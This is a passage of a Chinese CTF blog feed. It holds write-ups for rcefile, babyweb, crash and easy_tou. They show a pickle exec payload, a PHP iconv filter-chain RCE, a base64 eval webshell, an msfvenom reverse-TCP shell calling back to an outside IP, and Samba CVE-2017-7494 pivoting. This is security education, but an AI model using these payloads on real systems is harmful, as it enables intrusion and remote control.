    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><h2 id="强网先锋"><a href="#强网先锋" class="headerlink" title="强网先锋"></a>强网先锋</h2><h3 id="rcefile"><a href="#rcefile" class="headerlink" title="rcefile"></a>rcefile</h3><p>config.inc.php</p><figure class="highlight php"><table><tr><td class="gutter"><div class="code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></div></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">spl_autoload_register</span>();<br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">e</span>(<span class="hljs-params"><span class="hljs-variable">$str</span></span>)</span>&#123;<br>    <span class="hljs-keyword">return</span> <span class="hljs-title function_ invoke__">htmlspecialchars</span>(<span class="hljs-variable">$str</span>);<br>&#125;<br><span class="hljs-variable">$userfile</span> = <span class="hljs-keyword">empty</span>(<span class="hljs-variable">$_COOKIE</span>[<span class="hljs-string">&quot;userfile&quot;</span>]) ? [] : <span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$_COOKIE</span>[<span class="hljs-string">&quot;userfile&quot;</span>]);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>upload.php</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs awk">&lt;?php<br>include <span class="hljs-string">&quot;config.inc.php&quot;</span>;<br><br><span class="hljs-variable">$file</span> = <span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&quot;file&quot;</span>];<br><span class="hljs-keyword">if</span> (<span class="hljs-variable">$file</span>[<span class="hljs-string">&quot;error&quot;</span>] == <span class="hljs-number">0</span>) &#123;<br>    <span class="hljs-keyword">if</span>(<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&quot;file&quot;</span>][<span class="hljs-string">&#x27;size&#x27;</span>] &gt; <span class="hljs-number">0</span> &amp;&amp; <span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&quot;file&quot;</span>][<span class="hljs-string">&#x27;size&#x27;</span>] &lt; <span class="hljs-number">102400</span>) &#123;<br>        <span class="hljs-variable">$typeArr</span> = explode(<span class="hljs-string">&quot;/&quot;</span>, <span class="hljs-variable">$file</span>[<span class="hljs-string">&quot;type&quot;</span>]);<br>        <span class="hljs-variable">$imgType</span> = array(<span class="hljs-string">&quot;png&quot;</span>,<span class="hljs-string">&quot;jpg&quot;</span>,<span class="hljs-string">&quot;jpeg&quot;</span>);<br>        <span class="hljs-keyword">if</span>(!<span class="hljs-variable">$typeArr</span>[<span class="hljs-number">0</span>]== <span class="hljs-string">&quot;image&quot;</span> | !in_array(<span class="hljs-variable">$typeArr</span>[<span class="hljs-number">1</span>], <span class="hljs-variable">$imgType</span>))&#123;<br>            <span class="hljs-keyword">exit</span>(<span class="hljs-string">&quot;type error&quot;</span>);<br>        &#125;<br>        <span class="hljs-variable">$blackext</span> = [<span class="hljs-string">&quot;php&quot;</span>, <span class="hljs-string">&quot;php5&quot;</span>, <span class="hljs-string">&quot;php3&quot;</span>, <span class="hljs-string">&quot;html&quot;</span>, <span class="hljs-string">&quot;swf&quot;</span>, <span class="hljs-string">&quot;htm&quot;</span>,<span class="hljs-string">&quot;phtml&quot;</span>];<br>        <span class="hljs-variable">$filearray</span> = pathinfo(<span class="hljs-variable">$file</span>[<span class="hljs-string">&quot;name&quot;</span>]);<br>        <span class="hljs-variable">$ext</span> = <span class="hljs-variable">$filearray</span>[<span class="hljs-string">&quot;extension&quot;</span>];<br>        <span class="hljs-keyword">if</span>(in_array(<span class="hljs-variable">$ext</span>, <span class="hljs-variable">$blackext</span>)) &#123;<br>            <span class="hljs-keyword">exit</span>(<span class="hljs-string">&quot;extension error&quot;</span>);<br>        &#125;<br>        <span class="hljs-variable">$imgname</span> = md5(time()).<span class="hljs-string">&quot;.&quot;</span>.<span class="hljs-variable">$ext</span>;<br>        <span class="hljs-keyword">if</span>(move_uploaded_file(<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&quot;file&quot;</span>][<span class="hljs-string">&quot;tmp_name&quot;</span>],<span class="hljs-string">&quot;./&quot;</span>.<span class="hljs-variable">$imgname</span>)) &#123;<br>            array_push(<span class="hljs-variable">$userfile</span>, <span class="hljs-variable">$imgname</span>);<br>            setcookie(<span class="hljs-string">&quot;userfile&quot;</span>, serialize(<span class="hljs-variable">$userfile</span>), time() + <span class="hljs-number">3600</span>*<span class="hljs-number">10</span>);<br>            <span class="hljs-variable">$msg</span> = e(<span class="hljs-string">&quot;file: &#123;$imgname&#125;&quot;</span>);<br>            echo <span class="hljs-variable">$msg</span>;<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            echo <span class="hljs-string">&quot;upload failed!&quot;</span>;<br>        &#125;<br>    &#125;<br>&#125;<span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-keyword">exit</span>(<span class="hljs-string">&quot;error&quot;</span>);<br>&#125;<br>?&gt;<br></code></pre></td></tr></table></figure><p>spl_autoload_register函数可以对没有定义的类自动进行包含操作，spl_autoload_register()如果不指定参数，默认实现函数sql_autoload()，而这个函数在默认情况下，会自动将类名转换为小写，再在小写的类名后加上.inc或.php拓展名作为文件名，然后在路径中包含。<br>即能自动载入<code>.inc</code>和<code>.php</code></p><p>举例：如果目录下有example.inc，且php内容含有<code>class example&#123;...&#125;</code>或者有<code>new example()</code>，spl_autoload_register()会自动搜索、包含example.inc和example.php</p><p>而在config.inc.php中会<code>unserialize($_COOKIE[&quot;userfile&quot;])</code>，可以构造一个类名为上传inc文件名的类</p><p>首先正常上传后缀名为inc的马（.php在黑名单）<br><img src="http://81.70.101.23:11111/i/2022/08/04/u1w5qe_0.jpg"></p><p>接着在showfile.php中将cookie修改<br>payload：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> <br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">a52b19a367851ff3b193b8a52c954a66</span></span>&#123;<br>&#125;<br><span class="hljs-variable">$a</span>=<span class="hljs-keyword">new</span> <span class="hljs-keyword">new</span> a52b19a367851ff3b193b8a52c954a66;<br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">urlencode</span>(<span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$a</span>));<br></code></pre></td></tr></table></figure><p>(下图是getflag的inc文件的包含)<br><img src="http://81.70.101.23:11111/i/2022/08/04/u3atxs_0.png"></p><h2 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h2><h3 id="babyweb"><a href="#babyweb" class="headerlink" title="babyweb"></a>babyweb</h3><p>题目描述：<br>本题下发后，请通过http访问相应的ip和port，例如 nc ip port ，改为<a href="http://ip:port/">http://ip:port/</a><br>docker run -dit -p “0.0.0.0:pub_port:8888” babyweb</p><p>仔细读题，CSRF攻击，要让bot修改密码需要建立的websocket通道是对127.0.0.1:8888&#x2F;bot的，而不是靶机ip&#x2F;bot</p><p>在自己vps上构造钓鱼链接<br><img src="http://81.70.101.23:11111/i/2022/08/04/u68bp4_0.png"></p><p>让admin bot访问<br><img src="http://81.70.101.23:11111/i/2022/08/04/u6l7b7_0.png"></p><p>以admin和修改后的密码登录，在buy页面购买hint得到源码，但钱不够flag<br><img src="http://81.70.101.23:11111/i/2022/08/04/u6pttn_0.png"></p><p>利用python和go对json解析的差异<br><img src="http://81.70.101.23:11111/i/2022/08/04/u8imw6_0.png"><br><img src="http://81.70.101.23:11111/i/2022/08/04/u8khwb_0.png"></p><h3 id="crash"><a href="#crash" class="headerlink" title="crash"></a>crash</h3><p>题目描述：flag in 504 page</p><p>*.py</p><figure class="highlight kotlin"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><code class="hljs kotlin"><span class="hljs-keyword">import</span> base64<br># <span class="hljs-keyword">import</span> sqlite3<br><span class="hljs-keyword">import</span> pickle<br>from flask <span class="hljs-keyword">import</span> Flask, make_response,request, session<br><span class="hljs-keyword">import</span> admin<br><span class="hljs-keyword">import</span> random<br><br>app = Flask(__name__,static_url_path=<span class="hljs-string">&#x27;&#x27;</span>)<br>app.secret_key=random.randbytes(<span class="hljs-number">12</span>)<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">User</span>:</span><br><span class="hljs-class">    <span class="hljs-type">def __init__</span></span>(self, username,password):<br>        self.username=username<br>        self.token=hash(password)<br><br>def get_password(username):<br>    <span class="hljs-keyword">if</span> username==<span class="hljs-string">&quot;admin&quot;</span>:<br>        <span class="hljs-keyword">return</span> admin.secret<br>    <span class="hljs-keyword">else</span>:<br>        # conn=sqlite3.connect(<span class="hljs-string">&quot;user.db&quot;</span>)<br>        # cursor=conn.cursor()<br>        # cursor.execute(f<span class="hljs-string">&quot;select password from usertable where username=&#x27;&#123;username&#125;&#x27;&quot;</span>)<br>        # <span class="hljs-keyword">data</span>=cursor.fetchall()[<span class="hljs-number">0</span>]<br>        # <span class="hljs-keyword">if</span> <span class="hljs-keyword">data</span>:<br>        #     <span class="hljs-keyword">return</span> <span class="hljs-keyword">data</span>[<span class="hljs-number">0</span>]<br>        # <span class="hljs-keyword">else</span>:<br>        #     <span class="hljs-keyword">return</span> None<br>        <span class="hljs-keyword">return</span> session.<span class="hljs-keyword">get</span>(<span class="hljs-string">&quot;password&quot;</span>)<br><br><span class="hljs-meta">@app</span>.route(<span class="hljs-string">&#x27;/balancer&#x27;</span>, methods=[<span class="hljs-string">&#x27;GET&#x27;</span>, <span class="hljs-string">&#x27;POST&#x27;</span>])<br>def flag():<br>    pickle_data=base64.b64decode(request.cookies.<span class="hljs-keyword">get</span>(<span class="hljs-string">&quot;userdata&quot;</span>))<br>    <span class="hljs-keyword">if</span> b<span class="hljs-string">&#x27;R&#x27;</span> <span class="hljs-keyword">in</span> pickle_data or b<span class="hljs-string">&quot;secret&quot;</span> <span class="hljs-keyword">in</span> pickle_data:<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;You damm hacker!&quot;</span><br>    os.system(<span class="hljs-string">&quot;rm -rf *py*&quot;</span>)<br>    userdata=pickle.loads(pickle_data)<br>    <span class="hljs-keyword">if</span> userdata.token!=hash(get_password(userdata.username)):<br>         <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;Login First&quot;</span><br>    <span class="hljs-keyword">if</span> userdata.username==<span class="hljs-string">&#x27;admin&#x27;</span>:<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;Welcome admin, here is your next challenge!&quot;</span><br>    <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;You&#x27;re not admin!&quot;</span><br><br><span class="hljs-meta">@app</span>.route(<span class="hljs-string">&#x27;/login&#x27;</span>, methods=[<span class="hljs-string">&#x27;GET&#x27;</span>, <span class="hljs-string">&#x27;POST&#x27;</span>])<br>def login():<br>    resp = make_response(<span class="hljs-string">&quot;success&quot;</span>)<br>    session[<span class="hljs-string">&quot;password&quot;</span>]=request.values.<span class="hljs-keyword">get</span>(<span class="hljs-string">&quot;password&quot;</span>)<br>    resp.set_cookie(<span class="hljs-string">&quot;userdata&quot;</span>, base64.b64encode(pickle.dumps(User(request.values.<span class="hljs-keyword">get</span>(<span class="hljs-string">&quot;username&quot;</span>),request.values.<span class="hljs-keyword">get</span>(<span class="hljs-string">&quot;password&quot;</span>)),<span class="hljs-number">2</span>)), max_age=<span class="hljs-number">3600</span>)<br>    <span class="hljs-keyword">return</span> resp<br><br><span class="hljs-meta">@app</span>.route(<span class="hljs-string">&#x27;/&#x27;</span>, methods=[<span class="hljs-string">&#x27;GET&#x27;</span>, <span class="hljs-string">&#x27;POST&#x27;</span>])<br>def index():<br>    <span class="hljs-keyword">return</span> <span class="hljs-keyword">open</span>(<span class="hljs-string">&#x27;source.txt&#x27;</span>,<span class="hljs-string">&quot;r&quot;</span>).read()<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    app.run(host=<span class="hljs-string">&#x27;0.0.0.0&#x27;</span>, port=<span class="hljs-number">5000</span>)<br></code></pre></td></tr></table></figure><p>首先构造opcode，不能含有R和secret，需要拼接绕过，自定义一个admin.secret<br>padyload:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> base64<br><br>opcode=<span class="hljs-string">b&#x27;&#x27;&#x27;(cbuiltins</span><br><span class="hljs-string">exec</span><br><span class="hljs-string">S&#x27;c=&quot;import admin;admin.sec&quot;+&quot;ret=&#x27;b1ub1u&#x27;&quot;;exec(c)&#x27;</span><br><span class="hljs-string">o.&#x27;&#x27;&#x27;</span><br><br><span class="hljs-built_in">print</span>(base64.b64encode(opcode))<br></code></pre></td></tr></table></figure><p>填入cookie发包，返回500，重新用admin和b1ub1u登录，再进入balancer，进入均衡负载器的页面<br>题目描述flag在504页面，将每个ip的权重设为0或1爆破即可<br><img src="http://81.70.101.23:11111/i/2022/08/04/ubmrka_0.png"></p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>2022 DSCTF</title>
    <link href="/2022/07/18/2022%20DSCTF/"/>
    <url>/2022/07/18/2022%20DSCTF/</url>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>最喜欢easy_tou这种能一步步接近flag，又涉及很多知识的题了23333</p><p>ps：就是很烦，比赛之后想复现题目，但是环境撤的都那么快，只复现了一个easy_tou，图也还没来得及截全，阿西吧</p><h2 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h2><h3 id="easy-tou"><a href="#easy-tou" class="headerlink" title="easy_tou"></a>easy_tou</h3><p>首先是文件包含，LFI包含本地文件，用filter里的iconv编码构造不需要木马文件的RCE<br>先把一些<a href="https://tttang.com/archive/1395">文章</a>放这里，有空再在博客里写原理</p><p>payload:</p><figure class="highlight coq"><table><tr><td class="gutter"><div class="code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><pre><code class="hljs coq">php://filter/convert.base64-encode|<span class="hljs-type">convert</span>.iconv.UTF8.UTF7|<span class="hljs-type">convert</span>.iconv.UTF8.UTF16LE|<span class="hljs-type">convert</span>.iconv.UTF8.CSISO2022KR|<span class="hljs-type">convert</span>.iconv.UCS2.EUCTW|<span class="hljs-type">convert</span>.iconv.L4.UTF8|<span class="hljs-type">convert</span>.iconv.IEC_P271.UCS2|<span class="hljs-type">convert</span>.base64-decode|<span class="hljs-type">convert</span>.base64-encode|<span class="hljs-type">convert</span>.iconv.UTF8.UTF7|<span class="hljs-type">convert</span>.iconv.UTF8.CSISO2022KR|<span class="hljs-type">convert</span>.iconv.ISO2022KR.UTF16|<span class="hljs-type">convert</span>.iconv.L7.NAPLPS|<span class="hljs-type">convert</span>.base64-decode|<span class="hljs-type">convert</span>.base64-encode|<span class="hljs-type">convert</span>.iconv.UTF8.UTF7|<span class="hljs-type">convert</span>.iconv.UTF8.CSISO2022KR|<span class="hljs-type">convert</span>.iconv.ISO2022KR.UTF16|<span class="hljs-type">convert</span>.iconv.UCS<span class="hljs-number">-2</span>LE.UCS<span class="hljs-number">-2</span>BE|<span class="hljs-type">convert</span>.iconv.TCVN.UCS2|<span class="hljs-type">convert</span>.iconv<span class="hljs-number">.857</span>.SHIFTJISX0213|<span class="hljs-type">convert</span>.base64-decode|<span class="hljs-type">convert</span>.base64-encode|<span class="hljs-type">convert</span>.iconv.UTF8.UTF7|<span class="hljs-type">convert</span>.iconv.UTF8.UTF16LE|<span class="hljs-type">convert</span>.iconv.UTF8.CSISO2022KR|<span class="hljs-type">convert</span>.iconv.UCS2.EUCTW|<span class="hljs-type">convert</span>.iconv.L4.UTF8|<span class="hljs-type">convert</span>.iconv<span class="hljs-number">.866</span>.UCS2|<span class="hljs-type">convert</span>.base64-decode|<span class="hljs-type">convert</span>.base64-encode|<span class="hljs-type">convert</span>.iconv.UTF8.UTF7|<span class="hljs-type">convert</span>.iconv.UTF8.CSISO2022KR|<span class="hljs-type">convert</span>.iconv.ISO2022KR.UTF16|<span class="hljs-type">convert</span>.iconv.L3.T<span class="hljs-number">.61</span>|<span class="hljs-type">convert</span>.base64-decode|<span class="hljs-type">convert</span>.base64-encode|<span class="hljs-type">convert</span>.iconv.UTF8.UTF7|<span class="hljs-type">convert</span>.iconv.UTF8.UTF16LE|<span class="hljs-type">convert</span>.iconv.UTF8.CSISO2022KR|<span class="hljs-type">convert</span>.iconv.UCS2.UTF8|<span class="hljs-type">convert</span>.iconv.SJIS.GBK|<span class="hljs-type">convert</span>.iconv.L10.UCS2|<span class="hljs-type">convert</span>.base64-decode|<span class="hljs-type">convert</span>.base64-encode|<span class="hljs-type">convert</span>.iconv.UTF8.UTF7|<span class="hljs-type">convert</span>.iconv.UTF8.UTF16LE|<span class="hljs-type">convert</span>.iconv.UTF8.CSISO2022KR|<span class="hljs-type">convert</span>.iconv.UCS2.UTF8|<span class="hljs-type">convert</span>.iconv.ISO-IR<span class="hljs-number">-111.</span>UCS2|<span class="hljs-type">convert</span>.base64-decode|<span class="hljs-type">convert</span>.base64-encode|<span class="hljs-type">convert</span>.iconv.UTF8.UTF7|<span class="hljs-type">convert</span>.iconv.UTF8.UTF16LE|<span class="hljs-type">convert</span>.iconv.UTF8.CSISO2022KR|<span class="hljs-type">convert</span>.iconv.UCS2.UTF8|<span class="hljs-type">convert</span>.iconv.ISO-IR<span class="hljs-number">-111.</span>UJIS|<span class="hljs-type">convert</span>.iconv<span class="hljs-number">.852</span>.UCS2|<span class="hljs-type">convert</span>.base64-decode|<span class="hljs-type">convert</span>.base64-encode|<span class="hljs-type">convert</span>.iconv.UTF8.UTF7|<span class="hljs-type">convert</span>.iconv.UTF8.UTF16LE|<span class="hljs-type">convert</span>.iconv.UTF8.CSISO2022KR|<span class="hljs-type">convert</span>.iconv.UTF16.EUCTW|<span class="hljs-type">convert</span>.iconv.CP1256.UCS2|<span class="hljs-type">convert</span>.base64-decode|<span class="hljs-type">convert</span>.base64-encode|<span class="hljs-type">convert</span>.iconv.UTF8.UTF7|<span class="hljs-type">convert</span>.iconv.UTF8.CSISO2022KR|<span class="hljs-type">convert</span>.iconv.ISO2022KR.UTF16|<span class="hljs-type">convert</span>.iconv.L7.NAPLPS|<span class="hljs-type">convert</span>.base64-decode|<span class="hljs-type">convert</span>.base64-encode|<span class="hljs-type">convert</span>.iconv.UTF8.UTF7|<span class="hljs-type">convert</span>.iconv.UTF8.UTF16LE|<span class="hljs-type">convert</span>.iconv.UTF8.CSISO2022KR|<span class="hljs-type">convert</span>.iconv.UCS2.UTF8|<span class="hljs-type">convert</span>.iconv<span class="hljs-number">.851</span>.UTF8|<span class="hljs-type">convert</span>.iconv.L7.UCS2|<span class="hljs-type">convert</span>.base64-decode|<span class="hljs-type">convert</span>.base64-encode|<span class="hljs-type">convert</span>.iconv.UTF8.UTF7|<span class="hljs-type">convert</span>.iconv.UTF8.CSISO2022KR|<span class="hljs-type">convert</span>.iconv.ISO2022KR.UTF16|<span class="hljs-type">convert</span>.iconv.CP1133.IBM932|<span class="hljs-type">convert</span>.base64-decode|<span class="hljs-type">convert</span>.base64-encode|<span class="hljs-type">convert</span>.iconv.UTF8.UTF7|<span class="hljs-type">convert</span>.iconv.UTF8.CSISO2022KR|<span class="hljs-type">convert</span>.iconv.ISO2022KR.UTF16|<span class="hljs-type">convert</span>.iconv.UCS<span class="hljs-number">-2</span>LE.UCS<span class="hljs-number">-2</span>BE|<span class="hljs-type">convert</span>.iconv.TCVN.UCS2|<span class="hljs-type">convert</span>.iconv<span class="hljs-number">.851</span>.BIG5|<span class="hljs-type">convert</span>.base64-decode|<span class="hljs-type">convert</span>.base64-encode|<span class="hljs-type">convert</span>.iconv.UTF8.UTF7|<span class="hljs-type">convert</span>.iconv.UTF8.CSISO2022KR|<span class="hljs-type">convert</span>.iconv.ISO2022KR.UTF16|<span class="hljs-type">convert</span>.iconv.UCS<span class="hljs-number">-2</span>LE.UCS<span class="hljs-number">-2</span>BE|<span class="hljs-type">convert</span>.iconv.TCVN.UCS2|<span class="hljs-type">convert</span>.iconv<span class="hljs-number">.1046</span>.UCS2|<span class="hljs-type">convert</span>.base64-decode|<span class="hljs-type">convert</span>.base64-encode|<span class="hljs-type">convert</span>.iconv.UTF8.UTF7|<span class="hljs-type">convert</span>.iconv.UTF8.UTF16LE|<span class="hljs-type">convert</span>.iconv.UTF8.CSISO2022KR|<span class="hljs-type">convert</span>.iconv.UTF16.EUCTW|<span class="hljs-type">convert</span>.iconv.MAC.UCS2|<span class="hljs-type">convert</span>.base64-decode|<span class="hljs-type">convert</span>.base64-encode|<span class="hljs-type">convert</span>.iconv.UTF8.UTF7|<span class="hljs-type">convert</span>.iconv.UTF8.CSISO2022KR|<span class="hljs-type">convert</span>.iconv.ISO2022KR.UTF16|<span class="hljs-type">convert</span>.iconv.L7.SHIFTJISX0213|<span class="hljs-type">convert</span>.base64-decode|<span class="hljs-type">convert</span>.base64-encode|<span class="hljs-type">convert</span>.iconv.UTF8.UTF7|<span class="hljs-type">convert</span>.iconv.UTF8.UTF16LE|<span class="hljs-type">convert</span>.iconv.UTF8.CSISO2022KR|<span class="hljs-type">convert</span>.iconv.UTF16.EUCTW|<span class="hljs-type">convert</span>.iconv.MAC.UCS2|<span class="hljs-type">convert</span>.base64-decode|<span class="hljs-type">convert</span>.base64-encode|<span class="hljs-type">convert</span>.iconv.UTF8.UTF7|<span class="hljs-type">convert</span>.iconv.UTF8.CSISO2022KR|<span class="hljs-type">convert</span>.base64-decode|<span class="hljs-type">convert</span>.base64-encode|<span class="hljs-type">convert</span>.iconv.UTF8.UTF7|<span class="hljs-type">convert</span>.iconv.UTF8.UTF16LE|<span class="hljs-type">convert</span>.iconv.UTF8.CSISO2022KR|<span class="hljs-type">convert</span>.iconv.UCS2.UTF8|<span class="hljs-type">convert</span>.iconv.ISO-IR<span class="hljs-number">-111.</span>UCS2|<span class="hljs-type">convert</span>.base64-decode|<span class="hljs-type">convert</span>.base64-encode|<span class="hljs-type">convert</span>.iconv.UTF8.UTF7|<span class="hljs-type">convert</span>.iconv.UTF8.CSISO2022KR|<span class="hljs-type">convert</span>.iconv.ISO2022KR.UTF16|<span class="hljs-type">convert</span>.iconv.ISO6937.JOHAB|<span class="hljs-type">convert</span>.base64-decode|<span class="hljs-type">convert</span>.base64-encode|<span class="hljs-type">convert</span>.iconv.UTF8.UTF7|<span class="hljs-type">convert</span>.iconv.UTF8.CSISO2022KR|<span class="hljs-type">convert</span>.iconv.ISO2022KR.UTF16|<span class="hljs-type">convert</span>.iconv.L6.UCS2|<span class="hljs-type">convert</span>.base64-decode|<span class="hljs-type">convert</span>.base64-encode|<span class="hljs-type">convert</span>.iconv.UTF8.UTF7|<span class="hljs-type">convert</span>.iconv.UTF8.UTF16LE|<span class="hljs-type">convert</span>.iconv.UTF8.CSISO2022KR|<span class="hljs-type">convert</span>.iconv.UCS2.UTF8|<span class="hljs-type">convert</span>.iconv.SJIS.GBK|<span class="hljs-type">convert</span>.iconv.L10.UCS2|<span class="hljs-type">convert</span>.base64-decode|<span class="hljs-type">convert</span>.base64-encode|<span class="hljs-type">convert</span>.iconv.UTF8.UTF7|<span class="hljs-type">convert</span>.iconv.UTF8.CSISO2022KR|<span class="hljs-type">convert</span>.iconv.ISO2022KR.UTF16|<span class="hljs-type">convert</span>.iconv.UCS<span class="hljs-number">-2</span>LE.UCS<span class="hljs-number">-2</span>BE|<span class="hljs-type">convert</span>.iconv.TCVN.UCS2|<span class="hljs-type">convert</span>.iconv<span class="hljs-number">.857</span>.SHIFTJISX0213|<span class="hljs-type">convert</span>.base64-decode|<span class="hljs-type">convert</span>.base64-encode|<span class="hljs-type">convert</span>.iconv.UTF8.UTF7|<span class="hljs-type">convert</span>.base64-decode/resource=/etc/passwd&amp;<span class="hljs-number">0</span>=id<br></code></pre></td></tr></table></figure><p>没截图…空讲一下就是把0&#x3D;id那部分可以任意执行命令，只有nl可以用，但是ls和cat、tac这种没反应，推测靶机没有这些命令，先传入一个木马蚁剑连接一下<br><code>0=echo &quot;PD9waHAgZXZhbCgkX1BPU1RbJ2NoZW4nXSk7Pz4=&quot; &gt; /tmp/chen.php</code><br>然后蚁剑连接url为<code>http://47.93.179.206:30004/?file=php://filter/read=convert.base64-decode/resource=/tmp/chen.php</code>，密码为chen</p><p>在各目录下都找不到flag，而且root目录提示权限受限，尝试suid提权<br><code>find / -perm -u=s -type f 2&gt;/dev/null</code><br>尝试pkexec提权但是没有成功</p><p>接着用蚁剑的插件收集一些信息，端口扫描<br><img src="http://81.70.101.23:11111/i/2022/07/18/w7aodg_0.png"><br>并且当时战队里有人在说包含到了&#x2F;etc&#x2F;samba&#x2F;smb.conf</p><p>尝试用<a href="https://www.cnblogs.com/4thrun/p/15148613.html">[CVE-2017-7494] Samba命令执行漏洞</a></p><p>所以首先要在msf里有一个www的shell，如果用php木马反弹的话没有连接内网，所以要用tcp马<br><code>msfvenom -p linux/x86/meterpreter/reverse_tcp lhost=81.70.101.23 lport=6666  -f elf -o shell</code><br>msf监听exploit，把生成的可执行木马文件，用蚁剑上传，加一下运行权限，.&#x2F;运行一下<br>就收到shell了<br><img src="http://81.70.101.23:11111/i/2022/07/18/10m6ocg_0.png"></p><p><code>run poet/multi/manage/autoroute</code>，再返回上一个session，路由信息也传回来了<br><img src="http://81.70.101.23:11111/i/2022/07/18/10nolk6_0.png"></p><p>就可以利用CVE-2017-7494，msf一把梭了<br>设置options如下：<br><img src="http://81.70.101.23:11111/i/2022/07/18/10p5thf_0.png"></p><p>运行成功之后可以看到sessions中有一个新的shell了，进入后用grep就可以找到flag了<br><img src="http://81.70.101.23:11111/i/2022/07/18/10q1edc_0.png"></p><p>emmmm这里好像是复现的时候大家把环境打烂了把flag换了<br>正确的是flag{con_you_find_me_this_is_what_smbsmb_can_do_in_linux}</p><p>如果不用grep的话，可以重新用root的shell下运行一个木马，再反弹到另外一个msf上，这样另外的一个msf的meterpreter上能用dir看目录cat读flag了<br><img src="http://81.70.101.23:11111/i/2022/07/18/10rsnau_0.png"></p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>Dest0g3-520招新赛-复现</title>
    <link href="/2022/07/16/Dest0g3-520%E6%8B%9B%E6%96%B0%E8%B5%9B-%E5%A4%8D%E7%8E%B0/"/>
    <url>/2022/07/16/Dest0g3-520%E6%8B%9B%E6%96%B0%E8%B5%9B-%E5%A4%8D%E7%8E%B0/</url>
    
